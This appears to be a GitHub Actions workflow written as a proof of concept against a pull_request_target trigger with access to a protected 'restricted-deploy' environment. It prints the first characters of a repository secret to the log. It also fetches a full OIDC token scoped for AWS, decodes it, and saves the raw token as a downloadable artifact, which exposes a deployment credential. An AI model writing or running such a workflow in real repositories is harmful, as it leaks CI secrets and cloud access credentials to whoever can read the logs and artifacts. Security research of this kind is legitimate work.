name: OIDC PR Target Full Token
on:
  pull_request_target:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  test-restricted-env:
    runs-on: ubuntu-latest
    environment: restricted-deploy
    steps:
      - name: Test restricted-deploy environment access
        run: |
          echo "Secret available: ${{ secrets.RESTRICTED_SECRET != '' }}"
          echo "Environment: restricted-deploy"
          echo "Event: ${{ github.event_name }}"
          echo "Actor: ${{ github.actor }}"
          echo "Base ref: ${{ github.base_ref }}"
          echo "Head ref: ${{ github.head_ref }}"
          echo "RESTRICTED_SECRET is: ${RESTRICTED_SECRET:0:5}..."
        env:
          RESTRICTED_SECRET: ${{ secrets.RESTRICTED_SECRET }}
      - name: Capture OIDC token
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$T" | cut -d. -f2 | python3 -c "
import sys,base64,json; d=sys.stdin.read().strip()
p=d+'='*(4-len(d)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"
          echo "$T" > /tmp/oidc_token.txt
      - uses: actions/upload-artifact@v4
        with:
          name: restricted-env-oidc-poc
          path: /tmp/oidc_token.txt
          retention-days: 1
